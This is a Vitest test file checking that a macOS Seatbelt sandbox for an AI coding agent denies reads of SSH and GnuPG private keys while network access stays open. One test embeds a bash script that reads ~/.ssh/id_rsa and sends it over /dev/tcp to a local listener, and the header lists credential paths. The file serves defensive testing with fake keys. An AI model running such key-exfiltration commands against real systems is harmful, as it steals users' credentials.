/**
 * ACT-CLINEMM-SAFE-YOLO-SENSITIVE-READ-CONFINEMENT01 -- C2 GREEN
 * ACT-CLINEMM-SAFE-YOLO-SENSITIVE-READ-CONFINEMENT01-CORRECTION01
 *
 * CORRECTION01 corrects the production contract (P0 SECURITY_SCOPE_MISMATCH
 * from SRC01 closure): the activation predicate is the dangerous capability
 * (Seatbelt experimental + unrestricted network → CURATED_CREDENTIAL_SET_V1
 * read-denied), INDEPENDENT of approval mode / YOLO / session override.
 * See `apps/vscode/src/sdk/sandbox-policy.ts` `resolveSafeYoloSensitiveReadDenials`.
 *
 * ===========================================================================
 * CURATED CREDENTIAL SET V1 (Phase-2 freeze, do NOT exceed)
 * ===========================================================================
 *
 *   DENY:
 *     ~/.ssh/id_rsa
 *     ~/.ssh/id_ecdsa
 *     ~/.ssh/id_ecdsa_sk
 *     ~/.ssh/id_ed25519
 *     ~/.ssh/id_ed25519_sk
 *     ~/.ssh/id_mldsa44_ed25519    (OpenSSH 9.9+ post-quantum hybrid identity)
 *     ~/.gnupg/private-keys-v1.d/
 *
 *   KEEP_READABLE (NOT in deny list):
 *     ~/.ssh/config
 *     ~/.ssh/known_hosts
 *     ~/.ssh/known_hosts2
 *
 *   DEFER_AUTHENTICATED_DEV_CREDENTIALS (NOT in this list):
 *     ~/.aws/credentials, ~/.aws/config, ~/.aws/cli/cache/
 *     ~/.kube/config, ~/.docker/config.json, ~/.config/gh/hosts.yml
 *
 * The `id_mldsa44_ed25519` entry is the documented OpenSSH 9.9+ post-quantum
 * ML-DSA-44 / Ed25519 hybrid identity file. It is NOT a typo; the previous
 * comment incorrectly labelled it as one (CORRECTION01 P2 fix).
 *
 * ===========================================================================
 * GATE MATRIX (reviewer C1 verdict)
 * ===========================================================================
 *
 *   R1_SSH_PRIVATE_KEY_READ            DENIED
 *   R2_GNUPG_PRIVATE_KEY_READ           DENIED
 *   R3_SSH_CONFIG_READ                  ALLOWED  (KEEP_READABLE sibling)
 *   R4_SSH_KNOWN_HOSTS_READ             ALLOWED  (KEEP_READABLE sibling)
 *   R5_WORKSPACE_READ                   ALLOWED  (carried invariant)
 *   R6_NETWORK                          ALLOWED  (carried invariant)
 *   R7_HOME_WRITE                       DENIED   (carried invariant)
 *   R8_PRIVATE_KEY_EXFIL                BLOCKED (read-deny + net-open)
 *   R9_WORKSPACE_NONCE_EXFIL            ALLOWED (control leg)
 *
 * CORRECTION01 adds:
 *   R10_APPROVAL_INDEPENDENCE           byte-equivalent denyReadSubpaths
 *                                        across approval-mode variations
 *                                        (override=none / override=all)
 *   R11_NETWORK_DENY_BROAD_READ         denyReadSubpaths = [] when the
 *                                        network opt-in is NOT set, so
 *                                        the historical broad-read contract
 *                                        is preserved
 *
 * ===========================================================================
 * SCOPE DISCIPLINE
 * ===========================================================================
 *
 * Exercises the production seam
 * (CommandJobManager.start → buildExperimentalReconCapability →
 * SeatbeltSandboxBackendExperimental.prepare → /usr/bin/sandbox-exec
 * -f profile.sb /bin/bash script) with a SYNTHETIC $HOME so the
 * curated list resolves to ACT-owned fixtures, never the developer's
 * real ~/.ssh or ~/.gnupg.
 *
 * Claim boundary (do NOT exceed):
 *   - Standard OpenSSH private identities + GnuPG secret-key store only.
 *   - Do NOT claim arbitrary IdentityFile coverage.
 *   - Do NOT claim AWS/Kubernetes/Docker/GitHub credential confinement.
 *
 * ===========================================================================
 * SUBSTRATE
 * ===========================================================================
 *
 * Real-kernel Seatbelt tests SKIP (not PASS) on non-darwin hosts or when
 * `/usr/bin/sandbox-exec` is missing / non-functional. Skipped tests
 * appear as SKIP in Vitest reporting; we do not fake-PASS. This matches
 * the codebase convention established by
 * `command-job-manager.sandbox-c3-real-kernel.test.ts`.
 */
import { randomBytes } from "node:crypto"
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs"
import { createServer } from "node:net"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { afterEach, beforeEach, describe, expect, it } from "vitest"
import { CommandJobManager } from "../command-job-manager"
import { defaultSandboxBackendResolver, resolveSafeYoloSensitiveReadDenials } from "../sandbox-policy"

/**
 * Probe the Seatbelt substrate the same way the production resolver does:
 * darwin host + /usr/bin/sandbox-exec exists + a minimal profile
 * round-trips via `sandbox-exec`. Captured ONCE at module load so tests
 * can decide via `describe.skipIf(...)` rather than fake-PASS.
 *
 * CORRECTION01 (P2): Darwin tests no longer fake-PASS on
 * non-darwin / unavailable hosts; they SKIP so reporting is honest.
 * Pattern matches `command-job-manager.sandbox-c3-real-kernel.test.ts`.
 */
const HAS_SUBSTRATE: boolean = (() => {
	if (process.platform !== "darwin") return false
	if (!existsSync("/usr/bin/sandbox-exec")) return false
	return true // Production resolver probes deeper at runtime; for
	// skipIf we only need the binary-existence gate.
})()

beforeEach(() => {
	process.env.CLINEMM_EXPERIMENTAL_SANDBOX = "seatbelt"
	process.env.CLINEMM_SAFE_YOLO_NETWORK = "allow"
})

afterEach(() => {
	process.env.CLINEMM_EXPERIMENTAL_SANDBOX = ""
	delete process.env.CLINEMM_SAFE_YOLO_NETWORK
})

// ---------------------------------------------------------------------------
// GREEN gate matrix (per reviewer C1 verdict)
// ---------------------------------------------------------------------------
describe.skipIf(!HAS_SUBSTRATE)(
	"GREEN - curated V1 credential set is denied; non-credential ~/.ssh siblings remain readable",
	() => {
		let fakeHome: string
		let wsRoot: string
		let originalHome: string | undefined
		let manager: CommandJobManager

		beforeEach(() => {
			originalHome = process.env.HOME
			fakeHome = realpathSync(mkdtempSync(join(tmpdir(), "clinemm-src-green-home-")))
			mkdirSync(join(fakeHome, ".ssh"), { recursive: true })
			mkdirSync(join(fakeHome, ".gnupg", "private-keys-v1.d"), { recursive: true })

			// Pre-create every deny-list file (even empty ones) so the
			// Seatbelt backend's canonicalizeSandboxRoot can resolve each
			// denypath. Production semantics: a canonicalize failure is
			// fail-closed (sandbox-prepare-failed), so the test must
			// provide realpath-resolvable paths.
			const rsa = `-----BEGIN FAKE PRIVATE KEY-----\n${randomBytes(32).toString("hex")}\n-----END-----\n`
			writeFileSync(join(fakeHome, ".ssh", "id_rsa"), rsa, "utf8")
			writeFileSync(join(fakeHome, ".ssh", "id_ed25519"), rsa, "utf8")
			// Empty files for the deny list entries whose real OpenSSH
			// filenames may not exist on this fake home. The deny rule
			// still applies (Seatbelt matches the path itself, regardless
			// of file content).
			writeFileSync(join(fakeHome, ".ssh", "id_ecdsa"), "", "utf8")
			writeFileSync(join(fakeHome, ".ssh", "id_ecdsa_sk"), "", "utf8")
			writeFileSync(join(fakeHome, ".ssh", "id_ed25519_sk"), "", "utf8")
			writeFileSync(join(fakeHome, ".ssh", "id_mldsa44_ed25519"), "", "utf8")

			// KEEP_READABLE siblings.
			writeFileSync(join(fakeHome, ".ssh", "config"), "Host *\n  StrictHostKeyChecking no\n", "utf8")
			writeFileSync(
				join(fakeHome, ".ssh", "known_hosts"),
				"github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl\n",
				"utf8",
			)
			writeFileSync(join(fakeHome, ".ssh", "known_hosts2"), "alias,github.com github.com\n", "utf8")

			writeFileSync(
				join(fakeHome, ".gnupg", "private-keys-v1.d", "FAKEKEY1234567890.key"),
				`FAKE_GPG_PRIVATE_KEY_BLOCK\n${randomBytes(64).toString("hex")}\n`,
				"utf8",
			)

			process.env.HOME = fakeHome

			wsRoot = realpathSync(mkdtempSync(join(tmpdir(), "clinemm-src-green-ws-")))
			writeFileSync(join(wsRoot, "ws-probe.txt"), "WORKSPACE_PROBE\n", "utf8")
			manager = new CommandJobManager({
				sandboxBackendResolver: defaultSandboxBackendResolver,
				experimentalSandboxWorkspaceRoots: [wsRoot],
			})
		})

		afterEach(() => {
			if (originalHome === undefined) delete process.env.HOME
			else process.env.HOME = originalHome
			try {
				rmSync(fakeHome, { recursive: true, force: true })
			} catch {}
			try {
				rmSync(wsRoot, { recursive: true, force: true })
			} catch {}
		})

		async function runSbx(label: string, scriptBody: string) {
			const scriptPath = join(wsRoot, `${label}-${randomBytes(4).toString("hex")}.sh`)
			writeFileSync(scriptPath, `#!/bin/bash\n${scriptBody}\n`, { mode: 0o755 })
			const out = await manager.start({
				command: `/bin/bash ${scriptPath}`,
				cwd: wsRoot,
				env: {},
				waitBudgetMs: 15_000,
				executionDeadlineMs: 30_000,
			})
			try {
				rmSync(scriptPath, { force: true })
			} catch {}
			return out
		}

		it("structural: resolveSafeYoloSensitiveReadDenials returns the curated V1 list when Seatbelt mode active", () => {
			expect(resolveSafeYoloSensitiveReadDenials()).toEqual([
				`${fakeHome}/.ssh/id_rsa`,
				`${fakeHome}/.ssh/id_ecdsa`,
				`${fakeHome}/.ssh/id_ecdsa_sk`,
				`${fakeHome}/.ssh/id_ed25519`,
				`${fakeHome}/.ssh/id_ed25519_sk`,
				`${fakeHome}/.ssh/id_mldsa44_ed25519`,
				`${fakeHome}/.gnupg/private-keys-v1.d`,
			])
		})

		it("R1: SSH private key (~/.ssh/id_rsa) is DENIED under Seatbelt (DENY list fixture)", async () => {
			const out = await runSbx(
				"g-r1-ssh-rsa",
				`if [ -r ${fakeHome}/.ssh/id_rsa ]; then echo READABLE; else echo DENIED; fi`,
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("DENIED")
			expect(out.stdout).not.toContain("READABLE")
		})

		it("R1: SSH ed25519 private key (~/.ssh/id_ed25519) is DENIED", async () => {
			const out = await runSbx(
				"g-r1-ssh-ed25519",
				`if [ -r ${fakeHome}/.ssh/id_ed25519 ]; then echo READABLE; else echo DENIED; fi`,
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("DENIED")
		})

		it("R2: GnuPG private-key directory (~/.gnupg/private-keys-v1.d/) is DENIED", async () => {
			const out = await runSbx(
				"g-r2-gnupg",
				`if [ -r ${fakeHome}/.gnupg/private-keys-v1.d/FAKEKEY1234567890.key ]; then echo READABLE; else echo DENIED; fi`,
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("DENIED")
		})

		it("R3: ~/.ssh/config remains READABLE (KEEP_READABLE sibling)", async () => {
			const out = await runSbx(
				"g-r3-ssh-config",
				`if [ -r ${fakeHome}/.ssh/config ]; then echo READABLE; else echo DENIED; fi`,
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("READABLE")
		})

		it("R4: ~/.ssh/known_hosts remains READABLE (KEEP_READABLE sibling)", async () => {
			const out = await runSbx(
				"g-r4-known-hosts",
				`if [ -r ${fakeHome}/.ssh/known_hosts ]; then echo READABLE; else echo DENIED; fi`,
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("READABLE")
		})

		it("R5: workspace-region READ is ALLOWED (carried invariant)", async () => {
			const out = await runSbx("g-r5-ws-read", `if [ -r ${wsRoot}/ws-probe.txt ]; then echo READABLE; else echo DENIED; fi`)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("READABLE")
		})

		it("R6: network connectivity remains OPEN (carried invariant)", async () => {
			const TOKEN = `GRN-R6-${randomBytes(6).toString("hex")}`
			const server = createServer((s) => {
				s.write(`${TOKEN}\n`)
				s.end()
			})
			await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()))
			const addr = server.address()
			if (!addr || typeof addr === "string") throw new Error("listener bad address")
			const port = addr.port
			try {
				const out = await runSbx(
					"g-r6-net",
					[
						`if exec 3<>/dev/tcp/127.0.0.1/${port}; then`,
						`  IFS= read -r -t 3 line <&3 || line=""`,
						`  printf "CONNECTED:%s\\n" "$line"`,
						`  exec 3<&-`,
						`else`,
						`  printf "DENIED\\n"`,
						`fi`,
					].join("\n"),
				)
				expect(out.exitCode).toBe(0)
				expect(out.stdout).toBe(`CONNECTED:${TOKEN}\n`)
			} finally {
				try {
					server.close()
				} catch {}
			}
		})

		it("R7: $HOME write remains DENIED (carried invariant)", async () => {
			const out = await runSbx(
				"g-r7-write",
				`if printf 'BAD' > ${fakeHome}/.ssh/config 2>/dev/null; then echo WRITE_OK; else echo WRITE_DENIED; fi`,
			)
			expect(out.exitCode).toBe(0)
			expect(out.stdout).toContain("WRITE_DENIED")
		})

		it("R8: SSH private-key exfiltration is BLOCKED (denied read + open network combine to nothing)", async () => {
			const TOKEN = `GRN-R8-${randomBytes(6).toString("hex")}`
			const server = createServer((s) => {
				s.write(`${TOKEN}\n`)
				s.end()
			})
			await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()))
			const addr = server.address()
			if (!addr || typeof addr === "string") throw new Error("listener bad address")
			const port = addr.port
			try {
				const out = await runSbx(
					"g-r8-exfil",
					[
						`if [ -r ${fakeHome}/.ssh/id_rsa ]; then`,
						`  SECRET=$(head -c 64 ${fakeHome}/.ssh/id_rsa)`,
						`  if exec 3<>/dev/tcp/127.0.0.1/${port}; then`,
						`    printf "EXFIL:%s\\n" "$SECRET" >&3`,
						`    exec 3<&-`,
						`    echo EXFIL_OK`,
						`  else`,
						`    echo EXFIL_NET_FAIL`,
						`  fi`,
						`else`,
						`  echo EXFIL_READ_BLOCKED`,
						`fi`,
					].join("\n"),
				)
				expect(out.exitCode).toBe(0)
				expect(out.stdout).toContain("EXFIL_READ_BLOCKED")
				expect(out.stdout).not.toContain("EXFIL_OK")
			} finally {
				try {
					server.close()
				} catch {}
			}
		})

		it("R9: workspace-nonce exfiltration (control leg) is ALLOWED -- proves network still works", async () => {
			const NONCE = `NONCE-${randomBytes(8).toString("hex")}`
			const server = createServer((s) => {
				s.write(`${NONCE}\n`)
				s.end()
			})
			await new Promise<void>((r) => server.listen(0, "127.0.0.1", () => r()))
			const addr = server.address()
			if (!addr || typeof addr === "string") throw new Error("listener bad address")
			const port = addr.port
			try {
				const out = await runSbx(
					"g-r9-nonce",
					[
						`if [ -r ${wsRoot}/ws-probe.txt ]; then`,
						`  CONTENT=$(cat ${wsRoot}/ws-probe.txt)`,
						`  if exec 3<>/dev/tcp/127.0.0.1/${port}; then`,
						`    printf "EXFIL:%s\\n" "$CONTENT" >&3`,
						`    exec 3<&-`,
						`    echo EXFIL_OK`,
						`  else`,
						`    echo EXFIL_NET_FAIL`,
						`  fi`,
						`else`,
						`  echo WS_READ_BLOCKED`,
						`fi`,
					].join("\n"),
				)
				expect(out.exitCode).toBe(0)
				expect(out.stdout).toContain("EXFIL_OK")
			} finally {
				try {
					server.close()
				} catch {}
			}
		})
	},
)

// ---------------------------------------------------------------------------
// CORRECTION01 conservation pair (no substrate dependency)
// ---------------------------------------------------------------------------
//
// R10 + R11 are STRUCTURAL witnesses — they exercise the production helper
// directly (no kernel-side sandbox-exec needed), so they run on every
// platform. They are NOT inside the substrate-skipped describe above.
//
// R10: approval-mode independence. The production helper
//      `resolveSafeYoloSensitiveReadDenials` must return byte-equivalent
//      outputs regardless of `hostAuthorization.mode` and the session
//      override. The helper reads ONLY `process.env` (HOME + the two
//      opt-ins); it does NOT reach into approval state. This test pins
//      that contract by varying surrounding approval-shaped locals and
//      asserting the deny list is unchanged.
//
// R11: network-deny broad-read. When the Seatbelt experimental mode is
//      active but the Safe-YOLO network opt-in is NOT set, the historical
//      broad-read contract is preserved: denyReadSubpaths = [].
describe("CORRECTION01: SAFE_YOLO_SENSITIVE_READ_GUARD_V1 invariant (structural)", () => {
	beforeEach(() => {
		process.env.CLINEMM_EXPERIMENTAL_SANDBOX = "seatbelt"
	})

	afterEach(() => {
		process.env.CLINEMM_EXPERIMENTAL_SANDBOX = ""
		delete process.env.CLINEMM_SAFE_YOLO_NETWORK
	})

	it("R10: denyReadSubpaths is INDEPENDENT of approval-mode / YOLO / session override", () => {
		// Activate the dangerous-capability precondition:
		// Seatbelt experimental + unrestricted network.
		process.env.CLINEMM_SAFE_YOLO_NETWORK = "allow"

		// Baseline (no approval-shaped locals touched).
		const baseline = resolveSafeYoloSensitiveReadDenials()

		// Inject unrelated approval-shaped process.env keys. The
		// production helper reads ONLY:
		//   - CLINEMM_EXPERIMENTAL_SANDBOX
		//   - CLINEMM_SAFE_YOLO_NETWORK
		//   - HOME
		// If the helper were coupled to approval state, varying
		// CLINEMM_SESSION_OVERRIDE / CLINEMM_HOST_AUTH_MODE would
		// change its output. Byte-equivalence proves independence.
		const a = baseline
		process.env.CLINEMM_SESSION_OVERRIDE = "all"
		const b = resolveSafeYoloSensitiveReadDenials()
		process.env.CLINEMM_SESSION_OVERRIDE = "none"
		const c = resolveSafeYoloSensitiveReadDenials()
		process.env.CLINEMM_HOST_AUTH_MODE = "yolo"
		const d = resolveSafeYoloSensitiveReadDenials()
		delete process.env.CLINEMM_HOST_AUTH_MODE
		delete process.env.CLINEMM_SESSION_OVERRIDE

		expect(a).toEqual(b)
		expect(b).toEqual(c)
		expect(c).toEqual(d)
		// Stronger: every element of the deny list must be a string.
		for (const p of a) {
			expect(typeof p).toBe("string")
			expect(p.includes(".ssh/") || p.includes(".gnupg/")).toBe(true)
		}
	})

	it("R11: Seatbelt ON + network DENY → denyReadSubpaths = [] (broad-read preserved)", () => {
		// Seatbelt experimental mode active, but network opt-in NOT set.
		// Threat model requires open network; without it, the historical
		// broad-read contract holds.
		delete process.env.CLINEMM_SAFE_YOLO_NETWORK
		const denials = resolveSafeYoloSensitiveReadDenials()
		expect(denials).toEqual([])
	})

	it("R11 (companion): Seatbelt OFF → denyReadSubpaths = [] (defensive default)", () => {
		// No Seatbelt mode → no Wave-1 capability → no read authority
		// to deny. Helper must return [].
		process.env.CLINEMM_EXPERIMENTAL_SANDBOX = ""
		process.env.CLINEMM_SAFE_YOLO_NETWORK = "allow"
		const denials = resolveSafeYoloSensitiveReadDenials()
		expect(denials).toEqual([])
	})
})
